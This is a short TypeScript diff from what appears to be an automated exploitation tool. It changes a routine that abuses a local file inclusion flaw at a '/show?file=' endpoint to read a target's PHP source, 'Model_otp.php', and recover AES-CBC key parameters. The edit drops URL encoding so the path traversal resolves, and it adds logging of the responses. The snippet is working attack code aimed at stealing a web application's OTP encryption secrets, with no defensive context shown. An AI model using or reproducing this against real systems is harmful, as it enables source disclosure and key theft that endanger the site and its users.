@@ -616,7 +616,9 @@ async function sweepNegativeTransfer(
   const lfiRec = records.find((r) => /\/show\?file=/.test(r.request?.url ?? ""));
   const lfiBase = lfiRec ? (lfiRec.request!.url!.split("?file=")[0]) : `${apiOrigin}/api/show`;
   for (const src of ["api/application/models/Model_otp.php", "application/models/Model_otp.php"]) {
-    const r = await fire("GET", `${lfiBase}?file=${encodeURIComponent(src)}`, {}, null, null);
+    // file= must carry LITERAL slashes (encoding them to %2F stops the LFI resolving the path).
+    const r = await fire("GET", `${lfiBase}?file=${src}`, {}, null, null);
+    dbg(`LFI ${src}: status=${r?.response.status} len=${(r?.response.body ?? "").length}`);
     aes = parseAesCbcParams(r?.response.body ?? "");
     if (aes) { dbg(`recovered AES from LFI source ${src}`); break; }
   }
